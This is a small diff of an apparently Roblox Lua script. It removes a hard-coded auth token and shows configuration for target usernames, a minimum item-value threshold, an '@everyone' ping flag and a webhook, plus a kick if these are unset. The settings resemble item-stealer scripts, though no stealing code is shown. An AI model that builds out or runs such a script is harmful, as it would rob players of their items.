@@ -22,7 +22,6 @@ local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 100
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
-local auth_token = "EBK-SS-A" -- Ajouté ici
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add usernames or webhook")
